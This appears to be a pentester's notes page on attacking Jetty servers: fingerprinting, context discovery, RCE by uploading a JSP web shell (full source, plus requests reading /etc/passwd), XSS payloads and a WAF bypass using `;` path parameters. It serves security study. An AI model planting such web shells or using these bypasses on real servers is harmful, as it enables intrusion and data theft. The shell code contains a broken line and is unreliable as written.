# Jetty

## Detect

Jetty не реагирует на `;"`:

```
/;" or /existingUrl;"/

Nginx:  GET /;" -> 404 Not Found
Apache: GET /;" -> 404 Not Found
Jetty:  GET /;" -> 200 OK
```

## Jetty Overview

Variables:

$JETTY\_HOME — jetty distribution directory

$JETTY\_BASE — which contains configuration files, web applications, etc. `$JETTY_BASE` is ./ in relation to a process run by Jetty server

All web applications are stored `$JETTY_BASE/webapps/`

When applications are deployed, they are each assigned their own context. Every context has the contextPath property that defines the URL path served by the associated application. If an application has the contextPath “/test” , it will process all HTTP requests to /test/\*. Using contextPath and virtualHost, we can map different paths and virtual hosts to different applications.

Jetty can have a root web application (catch-all context) located in `$JETTY_BASE/webapps/root/` that processes all requests to /. In addition to /, this application will process all requests for a resource that is not associated with any registered contexts.

### Discovering contexts

У Jetty есть одна интересная особенность. Если нет приложения, отвечающего за root-контекст, то при обращении на несуществующий виртуальный хост будут выданы пути до всех контекстов.

```
GET / HTTP/1.1
Host: randomHost-sjdnvjks
```

### RCE via File Upload

#### JSP Servlets

By default, JSP files are processed in Jetty by org.eclipse.jetty.jsp.JettyJspServlet. This is configured in `$JETTY_HOME/etc/webdefault.xml`. Another default setting makes Jetty compile and execute all files matching the following masks:

* \*.jsp
* \*.jspf
* \*.jspx
* \*.xsp
* \*.JSP
* \*.JSPF
* \*.JSPX
* \*.XSP

To achieve RCE, we need to upload a file with one of these extensions to the server. &#x20;

Note: to enable JSP file processing in Jetty, the jsp module must be enabled.

**Case 1**

As I mentioned earlier, Jetty may have a root application that processes requests to the server root. Therefore, the easiest way to achieve RCE is to upload a JSP web shell to `$JETTY_BASE/webapps/root/` and then access it via HTTP.

```
GET /exec.jsp?cmd=cat+/etc/passwd HTTP/1.1
Host: jetty
```

```java
// $JETTY_BASE/webapps/root/exec.jsp
<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
   Process.p;
   p = Runtime.getRuntime().exec(request.getParameter("cmd"));
   InputStream in = p.getInputStream();
   DataInputStream dis = new DataInputStream(in);
   String disr = dis.readLine();
   while ( disr != null ) {
      out.println(disr);
      disr = dis.readLine();
   }
}
%>
```

**Case 2**

A JSP shell can also be uploaded to `$JETTY_BASE/work/` which is normally used as a parent directory for all temporary folders of web applications. When the web server starts, directories for each application will be created in it. The name of the directory will be in the format:

`"jetty-"+host+"-"+port+"-"+resourceBase+"-_"+context+"-"+virtualhost+"-"`

If we somehow manage to find out what temporary directory has been created, we can try to upload a JSP shell via: `$JETTY_BASE/work/"jetty-"+host+"-"+port+"-"+resourceBase+"-_"+context+"-"+virtualhost+"-"/webapps`

![](<../../../.gitbook/assets/изображение (4).png>)

Next we open the URL with the required context in our browser and we have RCE.

```
GET /testApp/exec.jsp?cmd=cat+/etc/passwd HTTP/1.1
Host: 192.168.99.129
```

File in:

```
work/jetty-0_0_0_0-8080-test_war-_testApp-any-/webapp/exec.jsp
```

### Web application upload

If uploading JSP files is impossible or the JSP handler is not enabled, we can use the automatic deploy (hot deploy) feature that is enabled in Jetty by default. When hot deploy is enabled, `$JETTY_BASE/webapps/` is constantly scanned for new web applications that are automatically deployed without us having to restart the Jetty server.

[Tomcat has the same feature but it is disabled by default](https://tomcat.apache.org/tomcat-8.0-doc/deployer-howto.html#Deploying\_on\_a\_running\_Tomcat\_server)

А web application in Jetty can be any of the following:

* A regular directory
* A WAR file
* An XML file (Jetty context XML file)

This means we have two file types that can give us RCE if we upload them to the server.

### XSS via file upload

We can achieve XSS on a Jetty server with standard configuration by uploading not only well-known .html or .svg files, but also other files with less popular extensions. To test this, I used two types of payload:

```markup
<!-- XML-based: -->
<a:script xmlns:a="http://www.w3.org/1999/xhtml">alert('XSS')</script>

<!-- HTML-based: -->
<script>alert('XSS')</script>
```

The results are in the table below. ([List](https://github.com/eclipse/jetty.project/blob/jetty-10.0.x/jetty-http/src/main/resources/org/eclipse/jetty/http/mime.properties) of extensions)

| Extension         | Payload | Browser                                                                                                                                                                                |
| ----------------- | ------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| .htm              | HTML    | ![](https://swarm.ptsecurity.com/wp-content/uploads/2022/09/8f48559e-icons8-chrome-24.png) ![](https://swarm.ptsecurity.com/wp-content/uploads/2022/09/e8018665-icons8-firefox-24.png) |
| .mathml           | XML     | ![](https://swarm.ptsecurity.com/wp-content/uploads/2022/09/e8018665-icons8-firefox-24.png)                                                                                            |
| .rdf              | XML     | ![](https://swarm.ptsecurity.com/wp-content/uploads/2022/09/e8018665-icons8-firefox-24.png)                                                                                            |
| .svgz             | XML     | ![](https://swarm.ptsecurity.com/wp-content/uploads/2022/09/8f48559e-icons8-chrome-24.png) ![](https://swarm.ptsecurity.com/wp-content/uploads/2022/09/e8018665-icons8-firefox-24.png) |
| .xht              | XML     | ![](https://swarm.ptsecurity.com/wp-content/uploads/2022/09/8f48559e-icons8-chrome-24.png) ![](https://swarm.ptsecurity.com/wp-content/uploads/2022/09/e8018665-icons8-firefox-24.png) |
| .xhtml            | XML     | ![](https://swarm.ptsecurity.com/wp-content/uploads/2022/09/8f48559e-icons8-chrome-24.png) ![](https://swarm.ptsecurity.com/wp-content/uploads/2022/09/e8018665-icons8-firefox-24.png) |
| .xml              | XML     | ![](https://swarm.ptsecurity.com/wp-content/uploads/2022/09/8f48559e-icons8-chrome-24.png) ![](https://swarm.ptsecurity.com/wp-content/uploads/2022/09/e8018665-icons8-firefox-24.png) |
| .xsd              | XML     | ![](https://swarm.ptsecurity.com/wp-content/uploads/2022/09/8f48559e-icons8-chrome-24.png) ![](https://swarm.ptsecurity.com/wp-content/uploads/2022/09/e8018665-icons8-firefox-24.png) |
| .xsl              | XML     | ![](https://swarm.ptsecurity.com/wp-content/uploads/2022/09/8f48559e-icons8-chrome-24.png) ![](https://swarm.ptsecurity.com/wp-content/uploads/2022/09/e8018665-icons8-firefox-24.png) |
| .\[randomSymbols] | HTML    | ![](https://swarm.ptsecurity.com/wp-content/uploads/2022/09/8f48559e-icons8-chrome-24.png) ![](https://swarm.ptsecurity.com/wp-content/uploads/2022/09/e8018665-icons8-firefox-24.png) |

## Bypass WAF or filters

With a thorough understanding of Jetty’s inner workings, we can find ways to exploit vulnerabilities in applications running on it even if those vulnerabilities are compensated by a WAF.

### Case 1

Knowing how the Jetty server parses URL addresses, we can bypass filters on a proxy server. Imagine that a Jetty server is deployed behind an NGINX proxy with a rule that blocks requests to /adminURL/\*.

```nginx
location ~ /adminURL/ {
   deny all;
}
location / {
   proxy_pass http://localhost:8080;
   proxy_set_header Host $host;
   proxy_set_header X-Real-IP $remote_addr;
}
```

If this rule is configured only on the proxy, we can send an HTTP request to `/adminURL;random/` and obtain access to the protected resource on the server:

```
/adminURL/ -> 403
/adminURL;aaa/ -> 200
```

Больше примеров в статье

## Papers & Notes

PT Swarm Research: [https://swarm.ptsecurity.com/jetty-features-for-hacking-web-apps/](https://swarm.ptsecurity.com/jetty-features-for-hacking-web-apps/)
